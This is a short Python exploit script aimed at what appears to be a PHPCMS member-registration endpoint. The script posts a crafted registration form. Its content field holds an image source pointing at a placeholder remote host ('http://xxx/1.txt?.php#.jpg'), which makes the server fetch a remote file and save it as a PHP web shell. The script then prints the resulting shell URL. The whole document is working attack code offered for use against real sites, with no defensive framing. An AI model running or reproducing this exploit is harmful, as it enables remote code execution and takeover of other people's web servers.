from sys import argv
import requests
import re


def run(target):
    h = requests.get(target+'/index.php?m=member&c=index&a=register&siteid=1')
    host = target+'/index.php?m=member&c=index&a=register&siteid=1'
    HEADER = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Referer": host,
        "Cookie":h.headers['Set-Cookie'].split(';')[0],
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "230"
    }
    payload = 'siteid=1&modelid=11&username=12c3a4a45c32524&password=123456&email=1a2a3c1ac456@126.com&info[content]=<img src=http://xxx/1.txt?.php#.jpg>&dosubmit=1&protocol='
    a = requests.post(target+'/index.php?m=member&c=index&a=register&siteid=1',data=payload,headers=HEADER)
    r = re.compile('src=(.*?)&')
    result = re.findall(r,a.text)
    if len(result)==1:
        print "Vulnerability exists shell:"+ result[0]
    else:
        print "Vulnerability does not exist"
        

if __name__ == '__main__':
    target =  argv[1]
    run(target)